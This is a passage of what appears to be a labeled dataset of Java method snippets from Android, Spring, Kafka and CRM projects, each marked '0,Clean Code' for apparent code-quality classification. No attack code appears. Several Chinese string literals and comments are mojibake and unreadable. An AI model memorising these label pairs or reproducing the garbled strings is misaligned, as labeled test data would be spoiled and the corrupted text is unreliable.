      int nextEscapePosition=scratchEscapePositions[i];
      int copyLength=nextEscapePosition - escapedPosition;
      System.arraycopy(data,escapedPosition,data,unescapedPosition,copyLength);
      unescapedPosition+=copyLength;
      data[unescapedPosition++]=0;
      data[unescapedPosition++]=0;
      escapedPosition+=copyLength + 3;
    }
    int remainingLength=unescapedLength - unescapedPosition;
    System.arraycopy(data,escapedPosition,data,unescapedPosition,remainingLength);
    return unescapedLength;
  }
}",0,Clean Code
"@Override protected void additionalAuthenticationChecks(UserDetails userDetails,UsernamePasswordAuthenticationToken authentication) throws AuthenticationException {
  AuthorizationUser user;
  if (userDetails instanceof AuthorizationUser) {
    user=(AuthorizationUser)userDetails;
  }
 else {
    logger.debug(""Authentication failed: no credentials provided"");
    throw new AuthException(AuthorizationCodeEnum.AUTHORIZATION_LOGIN_ERR);
  }
  if (authentication.getCredentials() == null) {
    logger.debug(""Authentication failed: no credentials provided"");
    throw new AuthException(AuthorizationCodeEnum.AUTHORIZATION_LOGIN_ERR);
  }
  String presentedPassword=authentication.getCredentials().toString();
  List<UserInfo> userInfoList=user.getUserInfoList();
  if (userInfoList.size() == 0) {
    throw new AuthException(AuthorizationCodeEnum.AUTHORIZATION_LOGIN_NO_USER);
  }
  AuthorizationUserInfo userDetailsInfo=new AuthorizationUserInfo();
  userInfoList.forEach(userInfo -> {
    AuthorizationUser authorizationUser=AuthorizationUser.toAuthorizationUser(userInfo);
    if (passwordEncoder.matches(presentedPassword,authorizationUser.toJSON())) {
      userDetailsInfo.addAuthorizationUser(authorizationUser);
    }
  }
);
  authentication.setDetails(userDetailsInfo);
}",0,Clean Code
"public static int changeColorAccent(ThemeInfo themeInfo,int accent,int color){
  if (accent == 0 || themeInfo.accentBaseColor == 0 || accent == themeInfo.accentBaseColor || themeInfo.firstAccentIsDefault && themeInfo.currentAccentId == DEFALT_THEME_ACCENT_ID) {
    return color;
  }
  float[] hsvTemp3=getTempHsv(3);
  float[] hsvTemp4=getTempHsv(4);
  Color.colorToHSV(themeInfo.accentBaseColor,hsvTemp3);
  Color.colorToHSV(accent,hsvTemp4);
  return changeColorAccent(hsvTemp3,hsvTemp4,color,themeInfo.isDark());
}
public static int changeColorAccent(int color){
  ThemeAccent accent=currentTheme.getAccent(false);
  return changeColorAccent(currentTheme,accent != null ? accent.accentColor : 0,color);
}
public static int changeColorAccent(float[] baseHsv,float[] accentHsv,int color,boolean isDarkTheme){
  if (tmpHSV5 == null) {
    tmpHSV5=new float[3];
  }
  float[] colorHsv=tmpHSV5;
  Color.colorToHSV(color,colorHsv);
  final float diffH=Math.min(abs(colorHsv[0] - baseHsv[0]),abs(colorHsv[0] - baseHsv[0] - 360f));
  if (diffH > 30f) {
    return color;
  }
  float dist=Math.min(1.5f * colorHsv[1] / baseHsv[1],1f);
  colorHsv[0]=colorHsv[0] + accentHsv[0] - baseHsv[0];
  colorHsv[1]=colorHsv[1] * accentHsv[1] / baseHsv[1];
  colorHsv[2]=colorHsv[2] * (1f - dist + dist * accentHsv[2] / baseHsv[2]);
  int newColor=Color.HSVToColor(Color.alpha(color),colorHsv);
  float origBrightness=AndroidUtilities.computePerceivedBrightness(color);
  float newBrightness=AndroidUtilities.computePerceivedBrightness(newColor);
  boolean needRevertBrightness=isDarkTheme ? origBrightness > newBrightness : origBrightness < newBrightness;
  if (needRevertBrightness) {
    float amountOfNew=0.6f;
    float fallbackAmount=(1f - amountOfNew) * origBrightness / newBrightness + amountOfNew;
    newColor=changeBrightness(newColor,fallbackAmount);
  }
  return newColor;
}",0,Clean Code
"private void findAllPrivateMembers(Class<?> cls){
  Field[] fields=cls.getDeclaredFields();
  for (  Field f : fields) {
    if (Modifier.isFinal(f.getModifiers()) || Modifier.isPrivate(f.getModifiers()) || Modifier.isProtected(f.getModifiers())) {
      memberRecord.privateOrFinalFields.add(f.getName());
    }
 else {
      memberRecord.nonPrivateNorFinalFields.add(f.getName());
    }
  }
  Method[] methods=cls.getDeclaredMethods();
  for (  final Method m : methods) {
    if (Modifier.isPrivate(m.getModifiers()) || Modifier.isProtected(m.getModifiers())) {
      checkAndAdd(memberRecord.privateMethods,m.getName(),getParameterLength(m));
    }
 else {
      checkAndAdd(memberRecord.nonPrivateMethods,m.getName(),getParameterLength(m));
    }
  }
  if (cls.getSuperclass() != null) {
    findAllPrivateMembers(cls.getSuperclass());
  }
}
",0,Clean Code
"private void scheduleCompaction(HoodieFlinkTable<?> table,long checkpointId) throws IOException {
  Option<HoodieInstant> firstRequested=table.getActiveTimeline().filterPendingCompactionTimeline().filter(instant -> instant.getState() == HoodieInstant.State.REQUESTED).firstInstant();
  if (!firstRequested.isPresent()) {
    LOG.info(""No compaction plan for checkpoint "" + checkpointId);
    return;
  }
  String compactionInstantTime=firstRequested.get().getTimestamp();
  HoodieCompactionPlan compactionPlan=CompactionUtils.getCompactionPlan(table.getMetaClient(),compactionInstantTime);
  if (compactionPlan == null || (compactionPlan.getOperations() == null) || (compactionPlan.getOperations().isEmpty())) {
    LOG.info(""Empty compaction plan for instant "" + compactionInstantTime);
  }
 else {
    HoodieInstant instant=HoodieTimeline.getCompactionRequestedInstant(compactionInstantTime);
    table.getActiveTimeline().transitionCompactionRequestedToInflight(instant);
    table.getMetaClient().reloadActiveTimeline();
    List<CompactionOperation> operations=compactionPlan.getOperations().stream().map(CompactionOperation::convertFromAvroRecordInstance).collect(toList());
    LOG.info(""Execute compaction plan for instant {} as {} file groups"",compactionInstantTime,operations.size());
    WriteMarkersFactory.get(table.getConfig().getMarkersType(),table,compactionInstantTime).deleteMarkerDir(table.getContext(),table.getConfig().getMarkersDeleteParallelism());
    for (    CompactionOperation operation : operations) {
      output.collect(new StreamRecord<>(new CompactionPlanEvent(compactionInstantTime,operation)));
    }
  }
}
",0,Clean Code
"private void setCoreServerInConfig(Config config){
  Server existingServer=config.getRecentCoreServers().stream().filter(server -> coreHost.getText().equals(server.getAlias())).findFirst().orElse(null);
  if (existingServer != null) {
    config.setCoreServer(existingServer);
    return;
  }
  String hostAsString=getHost(coreHost.getText());
  Integer portAsInteger=getPort(corePort.getText());
  if (hostAsString != null && !hostAsString.isEmpty() && portAsInteger != null && isValidPort(portAsInteger)) {
    Protocol protocol=portAsInteger == Protocol.HTTPS.getDefaultPort() ? Protocol.HTTPS : Protocol.HTTP;
    config.setCoreServer(new Server(protocol.toUrlString(hostAsString,portAsInteger)));
  }
 else   if (hostAsString != null && !hostAsString.isEmpty()) {
    config.setCoreServer(new Server(Protocol.HTTP.toUrlString(hostAsString)));
  }
 else {
    config.setCoreServer(null);
  }
}
",0,Clean Code
"private void handlePreambleAddressCode(byte cc1,byte cc2){
  int row=ROW_INDICES[cc1 & 0x07];
  boolean nextRowDown=(cc2 & 0x20) != 0;
  if (nextRowDown) {
    row++;
  }
  if (row != currentCueBuilder.row) {
    if (captionMode != CC_MODE_ROLL_UP && !currentCueBuilder.isEmpty()) {
      currentCueBuilder=new CueBuilder(captionMode,captionRowCount);
      cueBuilders.add(currentCueBuilder);
    }
    currentCueBuilder.row=row;
  }
  boolean isCursor=(cc2 & 0x10) == 0x10;
  boolean underline=(cc2 & 0x01) == 0x01;
  int cursorOrStyle=(cc2 >> 1) & 0x07;
  currentCueBuilder.setStyle(isCursor ? STYLE_UNCHANGED : cursorOrStyle,underline);
  if (isCursor) {
    currentCueBuilder.indent=COLUMN_INDICES[cursorOrStyle];
  }
}",0,Clean Code
"/** 
 * Creates a list that returns every  {@code n}th element of a list, starting at element  {@code k}. <p>It is OK if the list is empty or its size is not a multiple of {@code n}.</p> <p>For instance,  {@code quotientList(list, 2, 0)} returns the evenelements of a list, and  {@code quotientList(list, 2, 1)} returns the oddelements. Those lists are the same length only if list has even size.</p>
 */
public static <E>List<E> quotientList(final List<E> list,final int n,final int k){
  if (n <= 0 || k < 0 || k >= n) {
    throw new IllegalArgumentException(""n must be positive; k must be between 0 and n - 1"");
  }
  final int size=(list.size() + n - k - 1) / n;
  return new AbstractList<E>(){
    public E get(    int index){
      return list.get(index * n + k);
    }
    public int size(){
      return size;
    }
  }
;
}",0,Clean Code
"private Result<ReplicationMetrics> getMetricMessages(VersionItemParam param){
  ReplicationMetricParam metricParam=(ReplicationMetricParam)param;
  String metric=metricParam.getMetric();
  String topic=metricParam.getTopic();
  Long clusterId=metricParam.getClusterPhyId();
  Integer brokerId=metricParam.getBrokerId();
  Integer partitionId=metricParam.getPartitionId();
  Result<ReplicationMetrics> endRet=this.collectReplicaMetricsFromKafka(clusterId,topic,partitionId,brokerId,REPLICATION_METRIC_LOG_END_OFFSET);
  Result<ReplicationMetrics> startRet=this.collectReplicaMetricsFromKafka(clusterId,topic,partitionId,brokerId,REPLICATION_METRIC_LOG_START_OFFSET);
  ReplicationMetrics replicationMetrics=new ReplicationMetrics(clusterId,topic,brokerId,partitionId);
  if (null != endRet && endRet.successful() && null != startRet && startRet.successful()) {
    Float endOffset=endRet.getData().getMetrics().get(REPLICATION_METRIC_LOG_END_OFFSET);
    Float startOffset=startRet.getData().getMetrics().get(REPLICATION_METRIC_LOG_START_OFFSET);
    replicationMetrics.putMetric(metric,endOffset - startOffset);
    replicationMetrics.putMetric(REPLICATION_METRIC_LOG_END_OFFSET,endOffset);
    replicationMetrics.putMetric(REPLICATION_METRIC_LOG_START_OFFSET,startOffset);
  }
  return Result.buildSuc(replicationMetrics);
}
",0,Clean Code
"private static @Nullable ArrayList<Mesh> parseMshp(ParsableByteArray input){
  int version=input.readUnsignedByte();
  if (version != 0) {
    return null;
  }
  input.skipBytes(7);
  int encoding=input.readInt();
  if (encoding == TYPE_DFL8) {
    ParsableByteArray output=new ParsableByteArray();
    Inflater inflater=new Inflater(true);
    try {
      if (!Util.inflate(input,output,inflater)) {
        return null;
      }
    }
  finally {
      inflater.end();
    }
    input=output;
  }
 else   if (encoding != TYPE_RAW) {
    return null;
  }
  return parseRawMshpData(input);
}",0,Clean Code
"protected ColumnImpl(String columnName,int position,int jdbcType,int componentType,String typeName,String typeExpression,String charsetName,String defaultCharsetName,int columnLength,Integer columnScale,boolean optional,boolean autoIncremented,boolean generated){
  this(columnName,position,jdbcType,componentType,typeName,typeExpression,charsetName,defaultCharsetName,columnLength,columnScale,null,optional,autoIncremented,generated,null,false);
}
protected ColumnImpl(String columnName,int position,int jdbcType,int nativeType,String typeName,String typeExpression,String charsetName,String defaultCharsetName,int columnLength,Integer columnScale,boolean optional,boolean autoIncremented,boolean generated,Object defaultValue,boolean hasDefaultValue){
  this(columnName,position,jdbcType,nativeType,typeName,typeExpression,charsetName,defaultCharsetName,columnLength,columnScale,null,optional,autoIncremented,generated,defaultValue,hasDefaultValue);
}
protected ColumnImpl(String columnName,int position,int jdbcType,int nativeType,String typeName,String typeExpression,String charsetName,String defaultCharsetName,int columnLength,Integer columnScale,List<String> enumValues,boolean optional,boolean autoIncremented,boolean generated,Object defaultValue,boolean hasDefaultValue){
  this.name=columnName;
  this.position=position;
  this.jdbcType=jdbcType;
  this.nativeType=nativeType;
  this.typeName=typeName;
  this.typeExpression=typeExpression;
  if (typeUsesCharset() && (charsetName == null || ""DEFAULT"".equalsIgnoreCase(charsetName))) {
    charsetName=defaultCharsetName;
  }
  this.charsetName=charsetName;
  this.length=columnLength;
  this.scale=columnScale;
  this.optional=optional;
  this.autoIncremented=autoIncremented;
  this.generated=generated;
  this.defaultValue=defaultValue;
  this.hasDefaultValue=hasDefaultValue;
  this.enumValues=enumValues == null ? new ArrayList<>() : enumValues;
  assert this.length >= -1;
}",0,Clean Code
"public static void appendExtraViewInfoIntoSp(String extraField){
  final SharedPreferences CodeLocatorConfigIgnoreListSp=sApplication.getSharedPreferences(CodeLocator_CONFIG_IGNORE_LIST_SP,Context.MODE_PRIVATE);
  if (extraField != null && !extraField.isEmpty() && !""_"".equals(extraField)) {
    CodeLocatorConfigIgnoreListSp.edit().putString(""view_extra"",extraField).commit();
  }
 else {
    CodeLocatorConfigIgnoreListSp.edit().putString(""view_extra"","""").commit();
  }
  set=null;
}
",0,Clean Code
"@Override public void onLikeClicked(boolean like){
  if (!mIsMetadataLoaded) {
    MessageHelpers.showMessage(getContext(),R.string.wait_data_loading);
    getPlayer().setLikeButtonState(!like);
    return;
  }
  if (!YouTubeSignInService.instance().isSigned()) {
    getPlayer().setLikeButtonState(false);
    MessageHelpers.showMessage(getContext(),R.string.msg_signed_users_only);
    return;
  }
  if (like) {
    callMediaItemObservable(mMediaItemService::setLikeObserve);
  }
 else {
    callMediaItemObservable(mMediaItemService::removeLikeObserve);
  }
}
",0,Clean Code
"@Override public void onCreateContextMenu(@NonNull ContextMenu menu,@NonNull View v,@Nullable ContextMenu.ContextMenuInfo menuInfo){
  super.onCreateContextMenu(menu,v,menuInfo);
  Log.d(TAG,""onCreateContextMenu"");
  MenuInflater inflater=requireActivity().getMenuInflater();
  inflater.inflate(R.menu.app_context_menu,menu);
  AppStats stats=mAdapter.getSelectedItem();
  if (stats == null)   return;
  SharedPreferences prefs=PreferenceManager.getDefaultSharedPreferences(requireContext());
  boolean isBlocked=PCAPdroid.getInstance().getBlocklist().matchesApp(stats.getUid());
  menu.findItem(R.id.block_app).setVisible(!isBlocked);
  if (Prefs.isFirewallWhitelistMode(prefs)) {
    boolean isWhitelisted=PCAPdroid.getInstance().getFirewallWhitelist().matchesApp(stats.getUid());
    menu.findItem(R.id.add_to_fw_whitelist).setVisible(!isWhitelisted);
    menu.findItem(R.id.remove_from_fw_whitelist).setVisible(isWhitelisted);
  }
  menu.findItem(R.id.unblock_app_permanently).setVisible(isBlocked);
  menu.findItem(R.id.unblock_app_10m).setVisible(isBlocked).setTitle(getString(R.string.unblock_for_n_minutes,10));
  menu.findItem(R.id.unblock_app_1h).setVisible(isBlocked).setTitle(getString(R.string.unblock_for_n_hours,1));
  menu.findItem(R.id.unblock_app_8h).setVisible(isBlocked).setTitle(getString(R.string.unblock_for_n_hours,8));
}",0,Clean Code
"/** 
 * @param builder
 */
private ZhipuChatAIStreamClient(Builder builder){
  this.apiKey=builder.apiKey;
  this.key=builder.key;
  this.secret=builder.secret;
  this.apiHost=builder.apiHost;
  this.model=builder.model;
  this.embeddingModel=builder.embeddingModel;
  if (Objects.isNull(builder.okHttpClient)) {
    builder.okHttpClient=this.okHttpClient();
  }
  okHttpClient=builder.okHttpClient;
}
",0,Clean Code
"@Override public void close(){
  uri=null;
  if (multicastSocket != null) {
    try {
      multicastSocket.leaveGroup(address);
    }
 catch (    IOException e) {
    }
    multicastSocket=null;
  }
  if (socket != null) {
    socket.close();
    socket=null;
  }
  address=null;
  socketAddress=null;
  packetRemaining=0;
  if (opened) {
    opened=false;
    transferEnded();
  }
}",0,Clean Code
"@Override public String getAlarmMessage(final double curDurationValue,final double compareToDurationValue,final double changeValue,final AlarmLevel level){
  StringBuilder sb=new StringBuilder();
  sb.append(""褰撳墠"");
  sb.append(TimeUtils.getDurationChineseName(condition.getDuration()));
  sb.append(""鐨�"").append(isDurationGreaterThanCheckInterval() ? ""骞冲潎鍊�"" : ""鍊�"");
  sb.append(String.format(""%.2f"",curDurationValue));
  sb.append(""姣�"");
  sb.append(TimeUtils.getDurationChineseName(condition.getComparedTo()));
  sb.append(""鍓嶇殑"").append(isDurationGreaterThanCheckInterval() ? ""骞冲潎鍊�"" : ""鍊�"");
  sb.append(String.format(""%.2f"",compareToDurationValue));
  if (curDurationValue >= compareToDurationValue) {
    sb.append(""澧為暱浜�"");
  }
 else {
    sb.append(""闄嶄綆浜�"");
  }
  sb.append(String.format(""%.2f"",Math.abs(changeValue))).append(""%"");
  if (AlarmLevel.NORMAL.equals(level)) {
    return sb.toString();
  }
  if (!condition.isMathAbs() && changeValue < 0) {
    sb.append("","").append(String.format(""%.2f"",changeValue)).append(""%"");
  }
  sb.append(condition.getComparator());
  sb.append(""闃堝��"");
  double threshold=condition.getThresholds().get(level);
  sb.append(String.format(""%.2f"",threshold)).append(""%"");
  return sb.toString();
}",0,Clean Code
"/** 
 * 淇敼鑱旂郴浜鸿礋璐ｄ汉
 * @param changeOwnerUserBO 璐熻矗浜哄彉鏇碆O
 */
@Override public void changeOwnerUser(CrmChangeOwnerUserBO changeOwnerUserBO){
  Long newOwnerUserId=changeOwnerUserBO.getOwnerUserId();
  List<Integer> ids=changeOwnerUserBO.getIds();
  if (ids.size() == 0) {
    return;
  }
  for (  Integer id : ids) {
    if (AuthUtil.isChangeOwnerUserAuth(id,CrmEnum.CONTACTS,CrmAuthEnum.EDIT)) {
      throw new CrmException(SystemCodeEnum.SYSTEM_NO_AUTH);
    }
    CrmContacts contacts=getById(id);
    actionRecordUtil.addConversionRecord(id,CrmEnum.CONTACTS,newOwnerUserId,contacts.getName());
    if (2 == changeOwnerUserBO.getTransferType() && !changeOwnerUserBO.getOwnerUserId().equals(contacts.getOwnerUserId())) {
      ApplicationContextHolder.getBean(ICrmTeamMembersService.class).addSingleMember(getLabel(),contacts.getContactsId(),contacts.getOwnerUserId(),changeOwnerUserBO.getPower(),changeOwnerUserBO.getExpiresTime(),contacts.getName());
    }
    ApplicationContextHolder.getBean(ICrmTeamMembersService.class).deleteMember(getLabel(),new CrmMemberSaveBO(id,newOwnerUserId));
  }
  LambdaUpdateWrapper<CrmContacts> wrapper=new LambdaUpdateWrapper<>();
  wrapper.in(CrmContacts::getContactsId,ids);
  wrapper.set(CrmContacts::getOwnerUserId,newOwnerUserId);
  update(wrapper);
  String ownerUserName=UserCacheUtil.getUserName(newOwnerUserId);
  Map<String,Object> map=new HashMap<>();
  map.put(""ownerUserId"",newOwnerUserId);
  map.put(""ownerUserName"",ownerUserName);
  updateField(map,ids);
}",0,Clean Code
"private void checkDone(boolean animated,boolean ignoreClear){
  if (doneButton == null)   return;
  final boolean hasChanges=hasChanges();
  doneButton.setEnabled(hasChanges);
  if (animated) {
    doneButton.animate().alpha(hasChanges ? 1.0f : 0.0f).scaleX(hasChanges ? 1.0f : 0.0f).scaleY(hasChanges ? 1.0f : 0.0f).setDuration(180).start();
  }
 else {
    doneButton.setAlpha(hasChanges ? 1.0f : 0.0f);
    doneButton.setScaleX(hasChanges ? 1.0f : 0.0f);
    doneButton.setScaleY(hasChanges ? 1.0f : 0.0f);
  }
  if (listView != null && listView.adapter != null && clearVisible != !isEmpty()) {
    saveScrollPosition();
    listView.adapter.update(true);
    applyScrolledPosition();
  }
}",0,Clean Code
"private void loadModpacks(XC_LoadPackage.LoadPackageParam lpParam){
  if (Arrays.asList(ResourceManager.modRes.getStringArray(R.array.root_requirement)).contains(lpParam.packageName)) {
    forceConnectRootService();
  }
  for (  Class<? extends XposedModPack> mod : ModPacks.getMods(lpParam.packageName)) {
    try {
      XposedModPack instance=mod.getConstructor(Context.class).newInstance(mContext);
      if (!instance.listensTo(lpParam.packageName))       continue;
      try {
        instance.updatePrefs();
      }
 catch (      Throwable ignored) {
      }
      instance.handleLoadPackage(lpParam);
      runningMods.add(instance);
    }
 catch (    Throwable T) {
      log(""Start Error Dump - Occurred in "" + mod.getName());
      log(T);
    }
  }
}
",0,Clean Code
"@Override public CrmActivityVO getCrmActivityPageList(CrmActivityBO crmActivity){
  CrmActivityVO activityVO=new CrmActivityVO();
  Integer activityType=crmActivity.getActivityType();
  Integer activityTypeId=crmActivity.getActivityTypeId();
  int page=crmActivity.getPage() - 1;
  Map<String,Object> kv=new HashMap<>();
  kv.put(""activityType"",activityType);
  kv.put(""activityTypeId"",activityTypeId);
  kv.put(""crmType"",crmActivity.getCrmType());
  kv.put(""intervalDay"",crmActivity.getIntervalDay());
  kv.put(""search"",crmActivity.getSearch());
  kv.put(""startDate"",crmActivity.getStartDate());
  kv.put(""endDate"",crmActivity.getEndDate());
  kv.put(""page"",page);
  if (!UserUtil.isAdmin() && !AuthUtil.isReadFollowRecord(crmActivity.getCrmType())) {
    kv.put(""nofollowRecord"",true);
  }
  List<String> times=getBaseMapper().getActivityCountByTime(kv);
  String time=null;
  if (times.size() == 0) {
    activityVO.setList(new ArrayList<>());
  }
 else {
    time=times.get(0);
    kv.remove(""page"");
    kv.put(""time"",time);
    List<CrmActivity> recordList=getBaseMapper().getCrmActivityPageList(kv);
    recordList.forEach(record -> {
      if (record.getType() == 1 || record.getType() == 4) {
        buildActivityRelation(record);
      }
      SimpleUser user=UserCacheUtil.getSimpleUser(record.getCreateUserId());
      record.setUserImg(user.getImg());
      record.setRealname(user.getRealname());
    }
);
    activityVO.setList(recordList);
  }
  activityVO.setTime(time);
  activityVO.setLastPage(times.size() < 2);
  return activityVO;
}",0,Clean Code
"private boolean checkLimit(long timestamp){
  if (lastLimitedPacket != -1 && timestamp - lastLimitedPacket < 30 && limitedPackets++ >= 4) {
    return false;
  }
  if (lastLimitedPacket == -1 || timestamp - lastLimitedPacket >= 30) {
    lastLimitedPacket=timestamp;
    limitedPackets=0;
    return true;
  }
  return true;
}",0,Clean Code
"void setTotalTime(long totalTimeMs){
  if (totalTimeMs <= 0) {
    mTotalTime.setVisibility(View.GONE);
    mProgressBar.setVisibility(View.GONE);
  }
 else {
    mTotalTime.setVisibility(View.VISIBLE);
    mProgressBar.setVisibility(View.VISIBLE);
    mTotalTimeInMs=totalTimeMs;
    formatTime(totalTimeMs / 1000,mTotalTimeStringBuilder);
    mTotalTime.setText(mTotalTimeStringBuilder.toString());
    mProgressBar.setMax(Integer.MAX_VALUE);
  }
}
public void setTotalTime(ViewHolder vh,int ms){
  setTotalTimeLong(vh,(long)ms);
}",0,Clean Code
"/** 
 * Removes  {@link CachedContent} with the given key from index if it's empty and not locked. 
 */
public void maybeRemove(String key){
  CachedContent cachedContent=keyToContent.get(key);
  if (cachedContent != null && cachedContent.isEmpty() && !cachedContent.isLocked()) {
    keyToContent.remove(key);
    int id=cachedContent.id;
    boolean neverStored=newIds.get(id);
    storage.onRemove(cachedContent,neverStored);
    if (neverStored) {
      idToKey.remove(id);
      newIds.delete(id);
    }
 else {
      idToKey.put(id,null);
      removedIds.put(id,true);
    }
  }
}
",0,Clean Code
"@Override public void run(){
  try {
    executorThread=Thread.currentThread();
    if (!canceled) {
      TraceUtil.beginSection(""load:"" + loadable.getClass().getSimpleName());
      try {
        loadable.load();
      }
  finally {
        TraceUtil.endSection();
      }
    }
    if (!released) {
      sendEmptyMessage(MSG_END_OF_SOURCE);
    }
  }
 catch (  IOException e) {
    if (!released) {
      obtainMessage(MSG_IO_EXCEPTION,e).sendToTarget();
    }
  }
catch (  InterruptedException e) {
    Assertions.checkState(canceled);
    if (!released) {
      sendEmptyMessage(MSG_END_OF_SOURCE);
    }
  }
catch (  Exception e) {
    Log.e(TAG,""Unexpected exception loading stream"",e);
    if (!released) {
      obtainMessage(MSG_IO_EXCEPTION,new UnexpectedLoaderException(e)).sendToTarget();
    }
  }
catch (  OutOfMemoryError e) {
    Log.e(TAG,""OutOfMemory error loading stream"",e);
    if (!released) {
      obtainMessage(MSG_IO_EXCEPTION,new UnexpectedLoaderException(e)).sendToTarget();
    }
  }
catch (  Error e) {
    Log.e(TAG,""Unexpected error loading stream"",e);
    if (!released) {
      obtainMessage(MSG_FATAL_ERROR,e).sendToTarget();
    }
    throw e;
  }
}
@Override public void run(){
  callback.onLoaderReleased();
}
",0,Clean Code
"public void render(){
  if (shaders == null) {
    return;
  }
  if (bitmapBlurTexture != null) {
    renderBlur();
  }
  if (activePath != null) {
    renderBlitPath(getPaintTexture(),activePath,1f - .5f * helperAlpha - .5f * helperApplyAlpha);
  }
 else   if (activeShape != null) {
    renderBlitShape(getTexture(),getPaintTexture(),activeShape,1f);
  }
 else {
    renderBlit(getTexture(),1f);
  }
  if (helperTexture != 0 && helperShape != null && helperAlpha > 0) {
    renderBlitShape(helperTexture,getPaintTexture(),helperShape,.5f * helperAlpha + .5f * helperApplyAlpha);
  }
}",0,Clean Code
"@Override public void onClick(View v){
  if (mViewHolder.getOnItemViewClickedListener() != null) {
    mViewHolder.getOnItemViewClickedListener().onItemClicked(ibvh.getViewHolder(),ibvh.getItem(),mViewHolder,mViewHolder.getRow());
  }
  if (mActionClickedListener != null) {
    mActionClickedListener.onActionClicked((Action)ibvh.getItem());
  }
}
@Override public void onClick(View v){
  if (mViewHolder.getOnItemViewClickedListener() != null) {
    mViewHolder.getOnItemViewClickedListener().onItemClicked(ibvh.getViewHolder(),ibvh.getItem(),mViewHolder,mViewHolder.getRow());
  }
  if (mActionClickedListener != null) {
    mActionClickedListener.onActionClicked((Action)ibvh.getItem());
  }
}
",0,Clean Code
"@Override public Map<Long,KafkaController> getKafkaControllersFromDB(List<Long> clusterPhyIdList,boolean notIncludeNotAlive){
  List<KafkaControllerPO> poList=kafkaControllerDAO.listAllLatest();
  Map<Long,KafkaController> controllerMap=new HashMap<>();
  for (  KafkaControllerPO po : poList) {
    if ((po.getBrokerId().equals(Constant.INVALID_CODE) && notIncludeNotAlive) || !clusterPhyIdList.contains(po.getClusterPhyId())) {
      continue;
    }
    KafkaController kafkaController=new KafkaController();
    kafkaController.setClusterPhyId(po.getClusterPhyId());
    kafkaController.setBrokerId(po.getBrokerId());
    kafkaController.setTimestamp(po.getTimestamp());
    controllerMap.put(po.getClusterPhyId(),kafkaController);
  }
  return controllerMap;
}
",0,Clean Code
"private static void setHistoryInfo(FunctionalCaseStepDTO newCaseStep,Map<String,FunctionalCaseStepDTO> historyStepMap){
  FunctionalCaseStepDTO historyStep=historyStepMap.get(newCaseStep.getId());
  if (historyStep != null && StringUtils.equals(historyStep.getDesc(),newCaseStep.getDesc()) && StringUtils.equals(historyStep.getResult(),newCaseStep.getResult())) {
    newCaseStep.setExecuteResult(historyStep.getExecuteResult());
    newCaseStep.setActualResult(historyStep.getActualResult());
  }
}
",0,Clean Code
"private void maybeStopHostedTest(){
  if (hostedTest != null && hostedTestStarted && !forcedStopped) {
    forcedStopped=hostedTest.forceStop();
  }
}
",0,Clean Code
"static Set<Method> getAnnotatedMethodsInBaseType(Class<?> baseType){
  boolean ifcCheck=baseType.isInterface();
  if (ifcCheck && ClassUtils.isJavaLanguageInterface(baseType)) {
    return Collections.emptySet();
  }
  Set<Method> annotatedMethods=annotatedBaseTypeCache.get(baseType);
  if (annotatedMethods != null) {
    return annotatedMethods;
  }
  Method[] methods=(ifcCheck ? baseType.getMethods() : baseType.getDeclaredMethods());
  for (  Method baseMethod : methods) {
    try {
      if ((ifcCheck || !Modifier.isPrivate(baseMethod.getModifiers())) && hasSearchableAnnotations(baseMethod)) {
        if (annotatedMethods == null) {
          annotatedMethods=new HashSet<>();
        }
        annotatedMethods.add(baseMethod);
      }
    }
 catch (    Throwable ex) {
      handleIntrospectionFailure(baseMethod,ex);
    }
  }
  if (annotatedMethods == null) {
    annotatedMethods=Collections.emptySet();
  }
  annotatedBaseTypeCache.put(baseType,annotatedMethods);
  return annotatedMethods;
}
",0,Clean Code
"void performStart(){
  mChildFragmentManager.noteStateNotSaved();
  mChildFragmentManager.execPendingActions();
  mState=STARTED;
  mCalled=false;
  onStart();
  if (!mCalled) {
    throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStart()"");
  }
  mLifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START);
  if (mView != null) {
    mViewLifecycleOwner.handleLifecycleEvent(Lifecycle.Event.ON_START);
  }
  mChildFragmentManager.dispatchStart();
}
",0,Clean Code
"private void loadSearchResultAlt(String searchText){
  Log.d(TAG,""Start search for '%s'"",searchText);
  disposeActions();
  getView().showProgressBar(true);
  ContentService contentService=mService.getContentService();
  getView().clearSearch();
  mLoadAction=contentService.getSearchAltObserve(searchText,mUploadDateOptions | mDurationOptions | mTypeOptions| mFeatureOptions| mSortingOptions).subscribe(mediaGroups -> {
    Log.d(TAG,""Receiving results for '%s'"",searchText);
    for (    MediaGroup mediaGroup : mediaGroups) {
      VideoGroup group=VideoGroup.from(mediaGroup);
      startPlayFirstVideo(group);
      getView().updateSearch(group);
      mDeArrowProcessor.process(group);
    }
  }
,error -> {
    Log.e(TAG,""loadSearchData error: %s"",error.getMessage());
    if (getView() != null) {
      getView().showProgressBar(false);
    }
  }
,() -> {
    if (getView() != null) {
      getView().showProgressBar(false);
    }
  }
);
}
",0,Clean Code
"/** 
 * 鍟嗘満瑙ｉ櫎鍏宠仈鑱旂郴浜
 * @param relevanceBusinessBO 涓氬姟瀵硅薄
 */
@Override public void unrelateContacts(CrmRelevanceBusinessBO relevanceBusinessBO){
  CrmBusiness crmBusiness=getById(relevanceBusinessBO.getBusinessId());
  relevanceBusinessBO.getContactsIds().forEach(r -> {
    if (Objects.equals(r,crmBusiness.getContactsId())) {
      lambdaUpdate().set(CrmBusiness::getContactsId,null).eq(CrmBusiness::getBusinessId,crmBusiness.getBusinessId()).update();
    }
  }
);
  LambdaQueryWrapper<CrmContactsBusiness> wrapper=new LambdaQueryWrapper<>();
  wrapper.eq(CrmContactsBusiness::getBusinessId,relevanceBusinessBO.getBusinessId());
  wrapper.in(CrmContactsBusiness::getContactsId,relevanceBusinessBO.getContactsIds());
  crmContactsBusinessService.remove(wrapper);
}
",0,Clean Code
"@Override public Tree visit(@Nullable Tree tree,ExecutionContext ctx){
  SourceFile sourceFile=(SourceFile)requireNonNull(tree);
  if (sourceFile instanceof Quark || sourceFile instanceof Remote || sourceFile instanceof Binary) {
    return sourceFile;
  }
  PlainText plainText=PlainTextParser.convert(sourceFile);
  String searchStr=find;
  if (!Boolean.TRUE.equals(regex)) {
    searchStr=Pattern.quote(searchStr);
  }
  int patternOptions=0;
  if (!Boolean.TRUE.equals(caseSensitive)) {
    patternOptions|=Pattern.CASE_INSENSITIVE;
  }
  if (Boolean.TRUE.equals(multiline)) {
    patternOptions|=Pattern.MULTILINE;
  }
  if (Boolean.TRUE.equals(dotAll)) {
    patternOptions|=Pattern.DOTALL;
  }
